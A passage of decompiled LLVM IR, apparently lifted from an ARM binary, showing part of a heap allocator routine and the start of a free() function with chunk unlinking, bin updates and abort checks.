dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15cec, %dec_label_pc_15d30
  %v0_15db4 = phi i32 [ %v1_15cf0, %dec_label_pc_15cec ], [ %v2_15d38, %dec_label_pc_15d30 ]
  %v0_15d44 = phi i32 [ %v3_15d00, %dec_label_pc_15cec ], [ %v0_15d44.pre, %dec_label_pc_15d30 ]
  %v1_15d58 = phi i32 [ %v2_15cf4, %dec_label_pc_15cec ], [ %v0_15d40.pre, %dec_label_pc_15d30 ]
  %v0_15d3c = load i32, i32* @r4, align 4
  %v1_15d3c = add i32 %v0_15d3c, 44
  %v2_15d3c = inttoptr i32 %v1_15d3c to i32*
  %v3_15d3c = load i32, i32* %v2_15d3c, align 4
  store i32 %v3_15d3c, i32* %r3.global-to-local, align 4
  %v9_15d40 = icmp eq i32 %v1_15d58, %v3_15d3c
  %v1_15d44 = and i32 %v0_15d44, -4
  store i32 %v1_15d44, i32* %r5.global-to-local, align 4
  br i1 %v9_15d40, label %dec_label_pc_15db4, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d3c
  %v2_15d4c = add i32 %v1_15d58, %v1_15d44
  store i32 %v2_15d4c, i32* %r3.global-to-local, align 4
  %v1_15d50 = add i32 %v2_15d4c, 4
  %v2_15d50 = inttoptr i32 %v1_15d50 to i32*
  %v3_15d50 = load i32, i32* %v2_15d50, align 4
  store i32 %v3_15d50, i32* %r3.global-to-local, align 4
  %v1_15d54 = urem i32 %v3_15d50, 2
  %v2_15d54 = icmp eq i32 %v1_15d54, 0
  %v2_15d58 = add i32 %v1_15d58, 4
  %v3_15d58 = inttoptr i32 %v2_15d58 to i32*
  store i32 %v1_15d44, i32* %v3_15d58, align 4
  br i1 %v2_15d54, label %dec_label_pc_15d60, label %dec_label_pc_15d4c.dec_label_pc_15d90_crit_edge

dec_label_pc_15d4c.dec_label_pc_15d90_crit_edge:  ; preds = %dec_label_pc_15d4c
  %v0_15d94.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15d90

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d4c
  %v0_15d60 = load i32, i32* @r0, align 4
  %v1_15d60 = add i32 %v0_15d60, 8
  %v2_15d60 = inttoptr i32 %v1_15d60 to i32*
  %v3_15d60 = load i32, i32* %v2_15d60, align 4
  store i32 %v3_15d60, i32* @ip, align 4
  %v1_15d64 = add i32 %v3_15d60, 12
  %v2_15d64 = inttoptr i32 %v1_15d64 to i32*
  %v3_15d64 = load i32, i32* %v2_15d64, align 4
  store i32 %v3_15d64, i32* %r3.global-to-local, align 4
  %v9_15d68 = icmp eq i32 %v3_15d64, %v0_15d60
  %v1_15d6c = add i32 %v0_15d60, 12
  %v2_15d6c = inttoptr i32 %v1_15d6c to i32*
  %v3_15d6c = load i32, i32* %v2_15d6c, align 4
  store i32 %v3_15d6c, i32* %r2.global-to-local, align 4
  br i1 %v9_15d68, label %dec_label_pc_15d74, label %dec_label_pc_15d80

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d60
  %v1_15d74 = add i32 %v3_15d6c, 8
  %v2_15d74 = inttoptr i32 %v1_15d74 to i32*
  %v3_15d74 = load i32, i32* %v2_15d74, align 4
  store i32 %v3_15d74, i32* %r3.global-to-local, align 4
  %v9_15d78 = icmp eq i32 %v3_15d74, %v0_15d60
  br i1 %v9_15d78, label %dec_label_pc_15d84, label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d60, %dec_label_pc_15d24, %dec_label_pc_15d08, %dec_label_pc_15d74
  %v0_15d80 = call i32 @abort()
  store i32 %v0_15d80, i32* @r0, align 4
  %v0_15d84.pre = load i32, i32* @ip, align 4
  %v1_15d84.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d74, %dec_label_pc_15d80
  %v1_15d84 = phi i32 [ %v3_15d6c, %dec_label_pc_15d74 ], [ %v1_15d84.pre, %dec_label_pc_15d80 ]
  %v0_15d84 = phi i32 [ %v3_15d60, %dec_label_pc_15d74 ], [ %v0_15d84.pre, %dec_label_pc_15d80 ]
  %v2_15d84 = add i32 %v1_15d84, 8
  %v3_15d84 = inttoptr i32 %v2_15d84 to i32*
  store i32 %v0_15d84, i32* %v3_15d84, align 4
  %v0_15d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d88 = load i32, i32* @ip, align 4
  %v2_15d88 = add i32 %v1_15d88, 12
  %v3_15d88 = inttoptr i32 %v2_15d88 to i32*
  store i32 %v0_15d88, i32* %v3_15d88, align 4
  %v0_15d8c = load i32, i32* %lr.global-to-local, align 4
  %v1_15d8c = load i32, i32* %r5.global-to-local, align 4
  %v2_15d8c = add i32 %v1_15d8c, %v0_15d8c
  store i32 %v2_15d8c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d4c.dec_label_pc_15d90_crit_edge, %dec_label_pc_15d84
  %v0_15d94 = phi i32 [ %v0_15d94.pre, %dec_label_pc_15d4c.dec_label_pc_15d90_crit_edge ], [ %v2_15d8c, %dec_label_pc_15d84 ]
  %v0_15d90 = load i32, i32* %r7.global-to-local, align 4
  %v1_15d90 = add i32 %v0_15d90, 8
  %v2_15d90 = inttoptr i32 %v1_15d90 to i32*
  %v3_15d90 = load i32, i32* %v2_15d90, align 4
  store i32 %v3_15d90, i32* %r2.global-to-local, align 4
  %v1_15d94 = or i32 %v0_15d94, 1
  store i32 %v1_15d94, i32* %r3.global-to-local, align 4
  %v0_15d98 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15d98, i32* %v2_15d90, align 4
  %v0_15d9c = load i32, i32* %r1.global-to-local, align 4
  %v1_15d9c = load i32, i32* %r2.global-to-local, align 4
  %v2_15d9c = add i32 %v1_15d9c, 12
  %v3_15d9c = inttoptr i32 %v2_15d9c to i32*
  store i32 %v0_15d9c, i32* %v3_15d9c, align 4
  %v0_15da0 = load i32, i32* %lr.global-to-local, align 4
  %v1_15da0 = load i32, i32* %r1.global-to-local, align 4
  %v3_15da0 = add i32 %v1_15da0, %v0_15da0
  %v4_15da0 = inttoptr i32 %v3_15da0 to i32*
  store i32 %v0_15da0, i32* %v4_15da0, align 4
  %v0_15da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15da4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15da4 = add i32 %v1_15da4, 4
  %v3_15da4 = inttoptr i32 %v2_15da4 to i32*
  store i32 %v0_15da4, i32* %v3_15da4, align 4
  %v0_15da8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15da8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15da8 = add i32 %v1_15da8, 8
  %v3_15da8 = inttoptr i32 %v2_15da8 to i32*
  store i32 %v0_15da8, i32* %v3_15da8, align 4
  %v0_15dac = load i32, i32* %r7.global-to-local, align 4
  %v1_15dac = load i32, i32* %r1.global-to-local, align 4
  %v2_15dac = add i32 %v1_15dac, 12
  %v3_15dac = inttoptr i32 %v2_15dac to i32*
  store i32 %v0_15dac, i32* %v3_15dac, align 4
  br label %dec_label_pc_15dc4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15d3c
  %v2_15db4 = add i32 %v1_15d44, %v0_15db4
  %v1_15db8 = or i32 %v2_15db4, 1
  store i32 %v1_15db8, i32* %r3.global-to-local, align 4
  %v1_15dbc = load i32, i32* %r1.global-to-local, align 4
  %v2_15dbc = add i32 %v1_15dbc, 4
  %v3_15dbc = inttoptr i32 %v2_15dbc to i32*
  store i32 %v1_15db8, i32* %v3_15dbc, align 4
  %v0_15dc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15dc0 = load i32, i32* @r4, align 4
  %v2_15dc0 = add i32 %v1_15dc0, 44
  %v3_15dc0 = inttoptr i32 %v2_15dc0 to i32*
  store i32 %v0_15dc0, i32* %v3_15dc0, align 4
  br label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15d90, %dec_label_pc_15db4
  %v0_15dc4 = load i32, i32* %sl.global-to-local, align 4
  %v2_15dc4 = icmp eq i32 %v0_15dc4, 0
  store i32 %v0_15dc4, i32* %r1.global-to-local, align 4
  br i1 %v2_15dc4, label %dec_label_pc_15dd0.loopexit, label %dec_label_pc_15cec

dec_label_pc_15dd0.loopexit:                      ; preds = %dec_label_pc_15dc4
  %v0_15dd0.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_15dd0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15dd0

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15dd0.loopexit, %dec_label_pc_15cdc
  %v1_15dd0 = phi i32 [ %v1_15dd0.pre, %dec_label_pc_15dd0.loopexit ], [ %v1_15dd010, %dec_label_pc_15cdc ]
  %v0_15dd8 = phi i32 [ %v0_15dd0.pre, %dec_label_pc_15dd0.loopexit ], [ %v1_15ce8, %dec_label_pc_15cdc ]
  %v9_15dd0 = icmp eq i32 %v0_15dd8, %v1_15dd0
  br i1 %v9_15dd0, label %dec_label_pc_15e48, label %dec_label_pc_15dd8

dec_label_pc_15dd8:                               ; preds = %dec_label_pc_15dd0
  %v1_15dd8 = add i32 %v0_15dd8, 4
  store i32 %v1_15dd8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15de0.dec_label_pc_15de0_crit_edge:  ; preds = %dec_label_pc_15de0.preheader, %dec_label_pc_15de0.dec_label_pc_15de0_crit_edge
  %v0_15de0.pre = load i32, i32* @r4, align 4
  %v1_15de0.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_15de0 = mul i32 %v1_15de0.pre, 8
  %v5_15de0 = add i32 %v4_15de0, %v0_15de0.pre
  %v1_15de4 = add i32 %v1_15de0.pre, 1
  store i32 %v1_15de4, i32* %r2.global-to-local, align 4
  %v1_15de8 = add i32 %v5_15de0, 44
  store i32 %v1_15de8, i32* %r3.global-to-local, align 4
  %v2_15df0 = add i32 %v5_15de0, 52
  %v3_15df0 = inttoptr i32 %v2_15df0 to i32*
  store i32 %v1_15de8, i32* %v3_15df0, align 4
  %v0_15df4 = load i32, i32* %r3.global-to-local, align 4
  %v2_15df4 = add i32 %v0_15df4, 12
  %v3_15df4 = inttoptr i32 %v2_15df4 to i32*
  store i32 %v0_15df4, i32* %v3_15df4, align 4
  %v7_15df8 = icmp sgt i32 %v1_15de4, 95
  br i1 %v7_15df8, label %dec_label_pc_15dfc, label %dec_label_pc_15de0.dec_label_pc_15de0_crit_edge

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15de0.dec_label_pc_15de0_crit_edge
  %v0_15dfc = load i32, i32* @r4, align 4
  %v1_15dfc = inttoptr i32 %v0_15dfc to i32*
  %v2_15dfc = load i32, i32* %v1_15dfc, align 4
  store i32 %v2_15dfc, i32* %r2.global-to-local, align 4
  %v1_15e00 = add i32 %v0_15dfc, 864
  %v2_15e00 = inttoptr i32 %v1_15e00 to i32*
  %v3_15e00 = load i32, i32* %v2_15e00, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15e08 = urem i32 %v2_15dfc, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_15e10 = or i32 %v3_15e00, 1
  store i32 %v1_15e10, i32* %r1.global-to-local, align 4
  %v1_15e14 = or i32 %v1_15e08, 72
  store i32 %v1_15e14, i32* %r2.global-to-local, align 4
  %v1_15e18 = add i32 %v0_15dfc, 52
  store i32 %v1_15e18, i32* @ip, align 4
  %v2_15e1c = add i32 %v0_15dfc, 840
  %v3_15e1c = inttoptr i32 %v2_15e1c to i32*
  store i32 0, i32* %v3_15e1c, align 4
  %v0_15e20 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e20 = add i32 %v0_15e20, 65536
  store i32 %v1_15e20, i32* %r3.global-to-local, align 4
  %v0_15e24 = load i32, i32* %r0.global-to-local, align 4
  %v1_15e24 = load i32, i32* @r4, align 4
  %v2_15e24 = add i32 %v1_15e24, 836
  %v3_15e24 = inttoptr i32 %v2_15e24 to i32*
  store i32 %v0_15e24, i32* %v3_15e24, align 4
  %v0_15e28 = load i32, i32* %r0.global-to-local, align 4
  %v1_15e28 = load i32, i32* @r4, align 4
  %v2_15e28 = add i32 %v1_15e28, 844
  %v3_15e28 = inttoptr i32 %v2_15e28 to i32*
  store i32 %v0_15e28, i32* %v3_15e28, align 4
  %v1_15e2c = load i32, i32* @r4, align 4
  %v2_15e2c = add i32 %v1_15e2c, 852
  %v3_15e2c = inttoptr i32 %v2_15e2c to i32*
  store i32 %v1_15e20, i32* %v3_15e2c, align 4
  %v1_15e30 = load i32, i32* @r4, align 4
  %v2_15e30 = add i32 %v1_15e30, 864
  %v3_15e30 = inttoptr i32 %v2_15e30 to i32*
  store i32 %v1_15e10, i32* %v3_15e30, align 4
  %v1_15e34 = load i32, i32* @r4, align 4
  %v2_15e34 = inttoptr i32 %v1_15e34 to i32*
  store i32 %v1_15e14, i32* %v2_15e34, align 4
  %v0_15e38 = load i32, i32* @ip, align 4
  %v1_15e38 = load i32, i32* @r4, align 4
  %v2_15e38 = add i32 %v1_15e38, 44
  %v3_15e38 = inttoptr i32 %v2_15e38 to i32*
  store i32 %v0_15e38, i32* %v3_15e38, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_15e40 = call i32 @sysconf(i32 30, i32 %v1_15e10, i32 %v1_15e14, i32 %v1_15e20)
  store i32 %v4_15e40, i32* @r0, align 4
  %v1_15e44 = load i32, i32* @r4, align 4
  %v2_15e44 = add i32 %v1_15e44, 860
  %v3_15e44 = inttoptr i32 %v2_15e44 to i32*
  store i32 %v4_15e40, i32* %v3_15e44, align 4
  br label %dec_label_pc_15e48

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15dd0, %dec_label_pc_15dfc
  %v2_15e4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15e4c, i32* @r4, align 4
  %v1_15e50 = load i32, i32* @r0, align 4
  ret i32 %v1_15e50

; uselistorder directives
  uselistorder i32 %v0_15dfc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15df4, { 1, 0 }
  uselistorder i32 %v1_15dd8, { 1, 0 }
  uselistorder i32 %v0_15dc4, { 0, 2, 1 }
  uselistorder i32 %v0_15da0, { 1, 0 }
  uselistorder i32 %v1_15cf0, { 1, 0, 2 }
  uselistorder i32 %v0_15d08, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_15cc8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 6, 1, 2, 5, 3, 4 }
  uselistorder label %dec_label_pc_15e48, { 1, 0 }
  uselistorder label %dec_label_pc_15de0.dec_label_pc_15de0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15dc4, { 1, 0 }
  uselistorder label %dec_label_pc_15d90, { 1, 0 }
  uselistorder label %dec_label_pc_15d84, { 1, 0 }
  uselistorder label %dec_label_pc_15d80, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15d3c, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_15e54 = load i32, i32* @r4, align 4
  %v6_15e54 = load i32, i32* @r5, align 4
  %v9_15e54 = load i32, i32* @r6, align 4
  %v12_15e54 = load i32, i32* @r7, align 4
  %v18_15e54 = load i32, i32* @lr, align 4
  %v0_15e5c = load i32, i32* @r0, align 4
  store i32 %v0_15e5c, i32* @r6, align 4
  %v2_15e5c = icmp eq i32 %v0_15e5c, 0
  %v2_15e60 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r7, align 4
  br i1 %v2_15e5c, label %dec_label_pc_16068, label %dec_label_pc_15e6c

dec_label_pc_15e6c:                               ; preds = %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15e70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 76) to i32*), align 4
  store i32 %v4_15e70, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_15e70, i32* %r2.global-to-local, align 4
  %v4_15e7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 40) to i32*), align 4
  store i32 %v4_15e7c, i32* %r1.global-to-local, align 4
  store i32 %v2_15e60, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_15e88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  store i32 %v4_15e88, i32* %ip.global-to-local, align 4
  store i32 89748, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15e88)
  %v0_15e94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e94, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_15e9c = load i32, i32* @r7, align 4
  %v2_15e9c = add i32 %v0_15e9c, 20
  %v3_15e9c = inttoptr i32 %v2_15e9c to i32*
  %v4_15e9c = load i32, i32* %v3_15e9c, align 4
  store i32 %v4_15e9c, i32* %ip.global-to-local, align 4
  store i32 89768, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15e9c)
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_15eac = load i32, i32* @r7, align 4
  %v2_15eac = add i32 %v0_15eac, 36
  %v3_15eac = inttoptr i32 %v2_15eac to i32*
  %v4_15eac = load i32, i32* %v3_15eac, align 4
  store i32 %v4_15eac, i32* @lr, align 4
  %v0_15eb0 = load i32, i32* @r6, align 4
  %v1_15eb0 = add i32 %v0_15eb0, -4
  %v2_15eb0 = inttoptr i32 %v1_15eb0 to i32*
  %v3_15eb0 = load i32, i32* %v2_15eb0, align 4
  store i32 %v3_15eb0, i32* %r2.global-to-local, align 4
  %v1_15eb4 = inttoptr i32 %v4_15eac to i32*
  %v2_15eb4 = load i32, i32* %v1_15eb4, align 4
  store i32 %v2_15eb4, i32* %r3.global-to-local, align 4
  %v1_15eb8 = and i32 %v3_15eb0, -4
  store i32 %v1_15eb8, i32* %ip.global-to-local, align 4
  %v1_15ebc = add i32 %v0_15eb0, -8
  store i32 %v1_15ebc, i32* @r5, align 4
  store i32 %v1_15ebc, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_15eb8, %v2_15eb4
  br i1 %tmp, label %dec_label_pc_15eec, label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15e6c
  %v1_15ecc = or i32 %v2_15eb4, 3
  store i32 %v1_15ecc, i32* %r3.global-to-local, align 4
  store i32 %v1_15ecc, i32* %v1_15eb4, align 4
  %v3_15ed0 = load i32, i32* @lr, align 4
  %v4_15ed0 = add i32 %v3_15ed0, -8
  store i32 %v4_15ed0, i32* %lr.global-to-local, align 4
  %v0_15ed4 = load i32, i32* %ip.global-to-local, align 4
  %v3_15ed4 = udiv i32 %v0_15ed4, 8
  store i32 %v3_15ed4, i32* %r1.global-to-local, align 4
  %v1_15ed8 = add i32 %v3_15ed0, -4
  store i32 %v1_15ed8, i32* %r2.global-to-local, align 4
  %v4_15edc = mul nuw i32 %v3_15ed4, 4
  %v5_15edc = add i32 %v4_15edc, %v1_15ed8
  %v6_15edc = inttoptr i32 %v5_15edc to i32*
  %v7_15edc = load i32, i32* %v6_15edc, align 4
  store i32 %v7_15edc, i32* %r3.global-to-local, align 4
  %v1_15ee0 = load i32, i32* @r5, align 4
  %v2_15ee0 = add i32 %v1_15ee0, 8
  %v3_15ee0 = inttoptr i32 %v2_15ee0 to i32*
  store i32 %v7_15edc, i32* %v3_15ee0, align 4
  %v0_15ee4 = load i32, i32* @r5, align 4
  %v1_15ee4 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ee4 = load i32, i32* %r1.global-to-local, align 4
  %v5_15ee4 = mul i32 %v2_15ee4, 4
  %v6_15ee4 = add i32 %v5_15ee4, %v1_15ee4
  %v7_15ee4 = inttoptr i32 %v6_15ee4 to i32*
  store i32 %v0_15ee4, i32* %v7_15ee4, align 4
  br label %dec_label_pc_16050

dec_label_pc_15eec:                               ; preds = %dec_label_pc_15e6c
  %v1_15eec = and i32 %v3_15eb0, 2
  %v2_15eec = icmp eq i32 %v1_15eec, 0
  br i1 %v2_15eec, label %dec_label_pc_15ef4, label %dec_label_pc_16028

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15eec
  %v1_15ef4 = or i32 %v2_15eb4, 1
  store i32 %v1_15ef4, i32* %r3.global-to-local, align 4
  store i32 %v1_15ef4, i32* %v1_15eb4, align 4
  %v0_15efc = load i32, i32* @r6, align 4
  %v1_15efc = add i32 %v0_15efc, -4
  %v2_15efc = inttoptr i32 %v1_15efc to i32*
  %v3_15efc = load i32, i32* %v2_15efc, align 4
  store i32 %v3_15efc, i32* %r3.global-to-local, align 4
  %v0_15f00 = load i32, i32* @r5, align 4
  %v1_15f00 = load i32, i32* %ip.global-to-local, align 4
  %v2_15f00 = add i32 %v1_15f00, %v0_15f00
  store i32 %v2_15f00, i32* %lr.global-to-local, align 4
  %v1_15f04 = urem i32 %v3_15efc, 2
  %v2_15f04 = icmp eq i32 %v1_15f04, 0
  %v1_15f08 = add i32 %v2_15f00, 4
  %v2_15f08 = inttoptr i32 %v1_15f08 to i32*
  %v3_15f08 = load i32, i32* %v2_15f08, align 4
  store i32 %v3_15f08, i32* %r8.global-to-local, align 4
  br i1 %v2_15f04, label %dec_label_pc_15f10, label %dec_label_pc_15f44

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15ef4
  %v1_15f10 = add i32 %v0_15efc, -8
  %v2_15f10 = inttoptr i32 %v1_15f10 to i32*
  %v3_15f10 = load i32, i32* %v2_15f10, align 4
  store i32 %v3_15f10, i32* %r1.global-to-local, align 4
  %v2_15f14 = sub i32 %v0_15f00, %v3_15f10
  store i32 %v2_15f14, i32* %r3.global-to-local, align 4
  %v1_15f18 = add i32 %v2_15f14, 8
  %v2_15f18 = inttoptr i32 %v1_15f18 to i32*
  %v3_15f18 = load i32, i32* %v2_15f18, align 4
  store i32 %v3_15f18, i32* %r2.global-to-local, align 4
  %v1_15f1c = add i32 %v3_15f18, 12
  %v2_15f1c = inttoptr i32 %v1_15f1c to i32*
  %v3_15f1c = load i32, i32* %v2_15f1c, align 4
  store i32 %v3_15f1c, i32* %r4.global-to-local, align 4
  %v9_15f20 = icmp eq i32 %v3_15f1c, %v2_15f14
  %v1_15f24 = add i32 %v2_15f14, 12
  %v2_15f24 = inttoptr i32 %v1_15f24 to i32*
  %v3_15f24 = load i32, i32* %v2_15f24, align 4
  store i32 %v3_15f24, i32* %r0.global-to-local, align 4
  br i1 %v9_15f20, label %dec_label_pc_15f2c, label %dec_label_pc_15f90

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f10
  %v1_15f2c = add i32 %v3_15f24, 8
  %v2_15f2c = inttoptr i32 %v1_15f2c to i32*
  %v3_15f2c = load i32, i32* %v2_15f2c, align 4
  store i32 %v3_15f2c, i32* %r3.global-to-local, align 4
  %v9_15f30 = icmp eq i32 %v3_15f2c, %v2_15f14
  br i1 %v9_15f30, label %dec_label_pc_15f38, label %dec_label_pc_15f90

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f2c
  store i32 %v3_15f18, i32* %v2_15f2c, align 4
  %v0_15f3c = load i32, i32* %r0.global-to-local, align 4
  %v1_15f3c = load i32, i32* %r2.global-to-local, align 4
  %v2_15f3c = add i32 %v1_15f3c, 12
  %v3_15f3c = inttoptr i32 %v2_15f3c to i32*
  store i32 %v0_15f3c, i32* %v3_15f3c, align 4
  %v0_15f40 = load i32, i32* %ip.global-to-local, align 4
  %v1_15f40 = load i32, i32* %r1.global-to-local, align 4
  %v2_15f40 = add i32 %v1_15f40, %v0_15f40
  store i32 %v2_15f40, i32* %ip.global-to-local, align 4
  %v0_15f50.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15f54.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15ef4, %dec_label_pc_15f38
  %v0_15fd0 = phi i32 [ %v1_15f00, %dec_label_pc_15ef4 ], [ %v2_15f40, %dec_label_pc_15f38 ]
  %v0_15f54 = phi i32 [ %v3_15f08, %dec_label_pc_15ef4 ], [ %v0_15f54.pre, %dec_label_pc_15f38 ]
  %v1_15f68 = phi i32 [ %v2_15f00, %dec_label_pc_15ef4 ], [ %v0_15f50.pre, %dec_label_pc_15f38 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_15f48 = load i32, i32* @r7, align 4
  %v2_15f48 = add i32 %v0_15f48, 36
  %v3_15f48 = inttoptr i32 %v2_15f48 to i32*
  %v4_15f48 = load i32, i32* %v3_15f48, align 4
  store i32 %v4_15f48, i32* %r2.global-to-local, align 4
  %v1_15f4c = add i32 %v4_15f48, 44
  %v2_15f4c = inttoptr i32 %v1_15f4c to i32*
  %v3_15f4c = load i32, i32* %v2_15f4c, align 4
  store i32 %v3_15f4c, i32* %r3.global-to-local, align 4
  %v9_15f50 = icmp eq i32 %v1_15f68, %v3_15f4c
  %v1_15f54 = and i32 %v0_15f54, -4
  store i32 %v1_15f54, i32* %r0.global-to-local, align 4
  br i1 %v9_15f50, label %dec_label_pc_15fd0, label %dec_label_pc_15f5c

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f44
  %v2_15f5c = add i32 %v1_15f68, %v1_15f54
  store i32 %v2_15f5c, i32* %r3.global-to-local, align 4
  %v1_15f60 = add i32 %v2_15f5c, 4
  %v2_15f60 = inttoptr i32 %v1_15f60 to i32*
  %v3_15f60 = load i32, i32* %v2_15f60, align 4
  store i32 %v3_15f60, i32* %r3.global-to-local, align 4
  %v1_15f64 = urem i32 %v3_15f60, 2
  %v2_15f64 = icmp eq i32 %v1_15f64, 0
  %v2_15f68 = add i32 %v1_15f68, 4
  %v3_15f68 = inttoptr i32 %v2_15f68 to i32*
  store i32 %v1_15f54, i32* %v3_15f68, align 4
  br i1 %v2_15f64, label %dec_label_pc_15f70, label %dec_label_pc_15f5c.dec_label_pc_15fa0_crit_edge

dec_label_pc_15f5c.dec_label_pc_15fa0_crit_edge:  ; preds = %dec_label_pc_15f5c
  %v0_15fb0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15fa0

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f5c
  %v0_15f70 = load i32, i32* %lr.global-to-local, align 4
  %v1_15f70 = add i32 %v0_15f70, 8
  %v2_15f70 = inttoptr i32 %v1_15f70 to i32*
  %v3_15f70 = load i32, i32* %v2_15f70, align 4
  store i32 %v3_15f70, i32* %r1.global-to-local, align 4
  %v1_15f74 = add i32 %v3_15f70, 12
  %v2_15f74 = inttoptr i32 %v1_15f74 to i32*
  %v3_15f74 = load i32, i32* %v2_15f74, align 4
  store i32 %v3_15f74, i32* %r3.global-to-local, align 4
  %v9_15f78 = icmp eq i32 %v3_15f74, %v0_15f70
  %v1_15f7c = add i32 %v0_15f70, 12
  %v2_15f7c = inttoptr i32 %v1_15f7c to i32*
  %v3_15f7c = load i32, i32* %v2_15f7c, align 4
  store i32 %v3_15f7c, i32* %r2.global-to-local, align 4
  br i1 %v9_15f78, label %dec_label_pc_15f84, label %dec_label_pc_15f90

dec_label_pc_15f84:                               ; preds = %dec_label_pc_15f70
  %v1_15f84 = add i32 %v3_15f7c, 8
  %v2_15f84 = inttoptr i32 %v1_15f84 to i32*
  %v3_15f84 = load i32, i32* %v2_15f84, align 4
  store i32 %v3_15f84, i32* %r3.global-to-local, align 4
  %v9_15f88 = icmp eq i32 %v3_15f84, %v0_15f70
  br i1 %v9_15f88, label %dec_label_pc_15f94, label %dec_label_pc_15f90

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f70, %dec_label_pc_15f2c, %dec_label_pc_15f10, %dec_label_pc_15f84
  %v0_15f90 = call i32 @abort()
  store i32 %v0_15f90, i32* %r0.global-to-local, align 4
  %v0_15f94.pre = load i32, i32* @r1, align 4
  %v1_15f94.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_15f94

dec_label_pc_15f94:                               ; preds = %dec_label_pc_15f84, %dec_label_pc_15f90
  %v1_15f94 = phi i32 [ %v3_15f7c, %dec_label_pc_15f84 ], [ %v1_15f94.pre, %dec_label_pc_15f90 ]
  %v0_15f94 = phi i32 [ %v3_15f70, %dec_label_pc_15f84 ], [ %v0_15f94.pre, %dec_label_pc_15f90 ]
  %v2_15f94 = add i32 %v1_15f94, 8
  %v3_15f94 = inttoptr i32 %v2_15f94 to i32*
  store i32 %v0_15f94, i32* %v3_15f94, align 4
